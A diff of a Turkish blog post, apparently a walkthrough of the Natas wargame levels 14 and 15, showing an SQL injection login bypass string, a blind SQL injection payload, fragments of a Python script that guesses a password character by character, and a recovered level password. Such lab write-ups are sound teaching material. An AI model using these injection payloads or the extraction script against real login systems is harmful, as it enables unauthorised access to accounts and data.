@@ -404,7 +404,8 @@ Bizi bir login ekranı karşılıyor.
 <figure>
 <img src="/assets/img/natas/natas142.png">
 </figure>
-Kod SQLi zafiyeti barındıyor. `" or 1  # ` şeklinde bir payload girdiğimde,
+Kod SQLi zafiyeti barındıyor. `" or 1  # ` şeklinde bir payload girdiğimde;
+
 
  $query = "SELECT * from users where username=" " or 1  # " and password=" "; bu şekilde bir sorgu çalışmış olacak. 
  
@@ -419,6 +420,14 @@ Kod SQLi zafiyeti barındıyor. `" or 1  # ` şeklinde bir payload girdiğimde,
 </figure>
 
 Yine bir SQLi zafiyeti mevcut.Fakat bir öncekinden biraz farklı. Kod SQL syntax hatalarını vermiyor ve ekrana veri yansıtmıyor.Yani Blind SQLi zafiyeti mevcut.Ekrana veri yansıtılmadığı için dönen true-false yanıtlarına göre veriyi bizim inşaa etmemiz gerekli.
+
+Natas16 adında bir kullanıcı olduğunu biliyoruz.
+
+` natas16" AND password LIKE BINARY "A%" # ` şeklinde bir payload girildiğinde;
+
+  $query = "SELECT * from users where username=" natas16" AND password LIKE BINARY "A%" # ""; bu şekilde bir sorgu çalışacak.Yani natas16 kullanıcısının parolası A harfi ile başlıyorsa, sorgu sonucu ilgili satır dönücek ve ekrana "This user exists" mesajı yansıyacak.
+  
+Parolanın 32 karakter uzunluğunda olduğunu bir önceki seviyelerden biliyoruz.Bununla birlikte parola küçük harf, büyük harf ve rakam içeriyor. Manuel bir test yapılamayacağından , otomatize eden bir script yazıyoruz.
  
   {% highlight python %}
 import requests
@@ -435,10 +444,6 @@ for i in range(32):
                        print passwd
                        break
 {% endhighlight %}
-
-<figure>
-<img src="/assets/img/natas/natas152.png">
-</figure>
 
 >> natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 
